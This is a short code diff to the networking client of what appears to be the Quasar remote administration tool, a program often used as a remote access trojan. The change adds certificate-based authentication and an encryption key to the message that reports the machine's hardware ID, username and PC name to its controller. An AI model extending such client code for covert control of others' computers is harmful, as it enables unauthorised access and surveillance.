@@ -1,8 +1,4 @@
-﻿using System;
-using System.Diagnostics;
-using System.Threading;
-using System.Windows.Forms;
-using Quasar.Client.Commands;
+﻿using Quasar.Client.Commands;
 using Quasar.Client.Config;
 using Quasar.Client.Data;
 using Quasar.Client.Helper;
@@ -10,6 +6,11 @@ using Quasar.Client.Utilities;
 using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Utilities;
+using System;
+using System.Diagnostics;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Networking
 {
@@ -23,7 +24,8 @@ namespace Quasar.Client.Networking
         private readonly HostsManager _hosts;
         private readonly SafeRandom _random;
 
-        public QuasarClient(HostsManager hostsManager) : base()
+        public QuasarClient(HostsManager hostsManager, X509Certificate2 clientCertificate, X509Certificate2 serverCertificate)
+            : base(clientCertificate, serverCertificate)
         {
             this._hosts = hostsManager;
             this._random = new SafeRandom();
@@ -109,7 +111,8 @@ namespace Quasar.Client.Networking
                     Id = DevicesHelper.HardwareId,
                     Username = WindowsAccountHelper.GetName(),
                     PcName = SystemHelper.GetPcName(),
-                    Tag = Settings.TAG
+                    Tag = Settings.TAG,
+                    EncryptionKey = Settings.ENCRYPTIONKEY
                 });
 
                 if (ClientData.AddToStartupFailed)
